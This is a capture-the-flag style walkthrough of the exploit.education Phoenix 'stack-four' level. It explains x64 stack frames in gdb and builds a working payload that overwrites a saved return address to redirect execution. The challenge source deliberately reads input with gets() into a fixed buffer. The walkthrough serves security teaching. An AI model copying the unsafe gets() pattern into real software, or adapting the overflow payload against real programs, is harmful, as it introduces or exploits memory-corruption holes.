## Stack Four
Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

## Source Code
```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Challenge
The aim is to execute the function `complete_level()` by modifying the saved return address, and pointing it to the `complete_level()` function.

## Solution
A perfect example for a classic stack-smashing.

### The Plan
Another `gets()` overflow, only this time we will overwrite `start_level()`'s return address (on the stack) in order to redirect execution to `complete_level()`.

Don't worry if you don't understand what that means yet, we will debug our way through writing the exploit and understanding the concepts.

### Debugging
```console
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-four
```
```console
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  printf@plt
0x0000000000400470  gets@plt
0x0000000000400480  puts@plt
0x0000000000400490  exit@plt
0x00000000004004a0  __libc_start_main@plt
0x00000000004004b0  _start
0x00000000004004c6  _start_c
0x00000000004004f0  deregister_tm_clones
0x0000000000400520  register_tm_clones
0x0000000000400560  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
0x00000000004006a0  __do_global_ctors_aux
0x00000000004006e2  _fini
(gdb) b main
Breakpoint 1 at 0x40066e
(gdb) b start_level
Breakpoint 2 at 0x400639
```
Notice `complete_level()`'s address is `0x000000000040061d`, this is the address we want `start_level()` to return to.

```nasm
(gdb) r
(gdb) disas
Dump of assembler code for function main:
   0x000000000040066a <+0>:     push   rbp
   0x000000000040066b <+1>:     mov    rbp,rsp
=> 0x000000000040066e <+4>:     sub    rsp,0x10
   0x0000000000400672 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:    mov    edi,0x400750
   0x000000000040067e <+20>:    call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:    mov    eax,0x0
   0x0000000000400688 <+30>:    call   0x400635 <start_level>
   0x000000000040068d <+35>:    mov    eax,0x0
   0x0000000000400692 <+40>:    leave
   0x0000000000400693 <+41>:    ret
End of assembler dump.
```
`*main+30` is where `start_level()` is called, thus it will return to `*main+35` (the next instruction in `main()`)
> When a `call` instruction is executed, the address of the following instruction is
pushed onto the stack as the return address and control passes to the specified function.

```console
(gdb) b *main+30
Breakpoint 3 at 0x400688
(gdb) c
Continuing.
Welcome to phoenix/stack-four, brought to you by https://exploit.education
```
```nasm
 →   0x400688 <main+30>        call   0x400635 <start_level>
   ↳    0x400635 <start_level+0>  push   rbp
        0x400636 <start_level+1>  mov    rbp, rsp
        0x400639 <start_level+4>  sub    rsp, 0x50
        0x40063d <start_level+8>  lea    rax, [rbp-0x50]
```

#### About Stacks And Frames
> An x64 program uses a region of memory called the stack to support function calls. As the name
suggests, this region is organized as a stack data structure with the “top” of the stack growing
towards lower memory addresses. For each function call, new space is created on the stack to
store local variables and other data. This is known as a *stack frame*. To accomplish this, you will
need to write some code at the beginning and end of each function to create and destroy the
stack frame.

```nasm
0x400635 <start_level+0>  push   rbp
0x400636 <start_level+1>  mov    rbp, rsp
0x400639 <start_level+4>  sub    rsp, 0x50
```
These instructions are known as the *function prologue*, and they prepare the *stack frame* for `start_level()`.
1. Push `rbp` (*base pointer*, responsible for keeping track of the current function's stack frame) to the stack, in order to be able to recover the caller's stack frame when the function returns
2. Move `rsp` (*stack pointer*, points to the top item in the stack) to `rbp`, this defines the new stack frame's start
3. Subtract a number of bytes from `rsp`, reserves place on the stack for the function's local variables

We also have a *function epilogue*,
```nasm
0x400668 <start_level+51>  leave
0x400669 <start_level+52>  ret
```
> The `leave` instruction sets `rsp` to `rbp` and pops the top of the stack into `rbp`

> The `ret` instruction pops the return address from the stack and jumps there
1. Move `rbp` to `rsp`, recover stack pointer to the previous location (caller stack frame), before subtraction
2. Pop top item in the stack to `rbp`, restore caller's stack frame base
3. Pop the address function returns to from the stack
4. Jump to the address (thus returning)

#### Back To Debugging
After stepping through the function prolouge,
```nasm
     0x400637 <start_level+2>  mov    ebp, esp
     0x400639 <start_level+4>  sub    rsp, 0x50
 →   0x40063d <start_level+8>  lea    rax, [rbp-0x50]
     0x400641 <start_level+12> mov    rdi, rax
     0x400644 <start_level+15> call   0x400470 <gets@plt>
     0x400649 <start_level+20> mov    rax, QWORD PTR [rbp+0x8]
     0x40064d <start_level+24> mov    QWORD PTR [rbp-0x8], rax
```
![](/images/stack-4/0.png)

We can identify:
* 🟠 `rbp-0x50` - `buffer` being passed to `gets()`
* 🔴 `rbp` - base pointer points to the caller's base pointer (pushed to stack during prelouge)
* 🔵 `rbp+0x8` - return address (what we want to overwrite), pushed to stack during `call start_level`, thus outside of current stack frame
* 🟢 `rbp-0x8` - `ret` the pointer that get's the return address through `__builtin_return_address(0)`
* 🟣 `rbp-0x10` - padding added by compiler

### Breaking It
* 🟠🟣🟢 overwrite the `0x50` (80) bytes allocated to the local variables with junk
* 🔴 overwrite `rbp` with it's value
* 🔵 overwrite the return address with `0x000000000040061d` (the address of `complete_level()`)

Get `rbp`'s value:
```console
(gdb) dereference $rbp
0x00007fffffffe670│+0x0000: 0x00007fffffffe690  →  0x0000000000000001    ← $rbp
```

We can use `pwntools`' `p64()` to pack a 64bit little-endian integer.

```console
user@phoenix-amd64:~$ python -c "from pwn import p64; f=open('smash', 'wb'); f.write('a'*0x50+p64(0x00007fffffffe690)+p64(0x000000000040061d))"
user@phoenix-amd64:~$ hexdump -C smash
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
*
00000050  90 e6 ff ff ff 7f 00 00  1d 06 40 00 00 00 00 00  |..........@.....|
00000060
```

![](/images/stack-4/1.png)

```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-four < smash
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
🥳
